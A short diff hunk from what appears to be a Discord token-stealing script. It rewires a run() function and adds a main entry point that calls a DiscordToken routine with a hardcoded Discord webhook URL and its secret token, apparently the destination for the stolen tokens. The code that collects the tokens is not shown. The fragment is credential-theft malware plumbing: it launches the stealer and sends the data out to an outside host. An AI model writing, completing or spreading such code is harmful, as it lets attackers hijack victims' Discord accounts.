@@ -403,6 +403,8 @@ class upload_tokens:
                               avatar_url="https://i.imgur.com/HjzfjfR.png")
 
 
-def run(**args):
-    discord = DiscordToken('https://discord.com/api/webhooks/1248936011812311130/UANsOXfQ6U5wfjpk7z9ihQ_lnCxXIEc4DUeKz58Ihfj29Lc6O3k9x0llGnsn3CGc-6rV')
-    return str(discord)
+def run():
+    DiscordToken('https://discord.com/api/webhooks/1248936011812311130/UANsOXfQ6U5wfjpk7z9ihQ_lnCxXIEc4DUeKz58Ihfj29Lc6O3k9x0llGnsn3CGc-6rV')
+
+if __name__ == '__main__':
+    run()
